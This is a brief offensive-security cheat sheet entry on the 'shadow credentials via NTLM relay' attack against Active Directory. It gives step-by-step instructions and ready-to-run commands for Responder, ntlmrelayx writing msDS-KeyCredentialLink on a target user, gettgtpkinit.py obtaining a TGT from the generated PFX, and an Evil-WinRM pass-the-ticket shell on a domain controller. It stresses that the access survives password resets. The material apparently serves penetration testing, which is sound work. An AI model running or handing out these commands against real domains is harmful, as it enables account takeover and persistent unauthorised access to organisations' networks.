# 12.12 Shadow Credentials via NTLM Relay

> Relay elevated NTLM to LDAP to write `msDS-KeyCredentialLink` on a target user, then PKINIT TGT via the new PFX — persists past password resets.

## Overview

If a relayed account has elevated privileges over a target user (e.g. Full Control via ACL), relay its NTLM authentication over LDAP to set a KeyCredentialLink (msDS-KeyCredentialLink) on the target, adding shadow credentials. Obtain a TGT with gettgtpkinit.py using the generated PFX certificate, then pass-the-ticket with Evil-WinRM. Persists across password changes.

## Steps

- Requires PKINIT support (AD CS installed or internal PKI)
- Run Responder with HTTP server Off (SMB On to capture the authentication)
- ntlmrelayx --shadow-credentials --shadow-target TARGET_USER relays to DC's LDAP
- ntlmrelayx saves a .pfx certificate and its password on success
- Use gettgtpkinit.py with -cert-pfx and -pfx-pass to get TGT into .ccache
- Pass-the-ticket with KRB5CCNAME=jperez.ccache evil-winrm -r DOMAIN

## Commands

### Shadow credentials relay

```bash
ntlmrelayx.py -t ldap://<DOMAIN>.LOCAL\\[email protected] --shadow-credentials --shadow-target jperez --no-da --no-dump --no-acl
```

### Get TGT from PFX

```bash
python3 gettgtpkinit.py -cert-pfx rbnYdUv8.pfx -pfx-pass NRzoep723H6Yfc0pY91Z <DOMAIN>.LOCAL/jperez jperez.ccache
```

### Pass-the-ticket Evil-WinRM

```bash
KRB5CCNAME=jperez.ccache evil-winrm -i dc01.<DOMAIN>.local -r <DOMAIN>.LOCAL
```
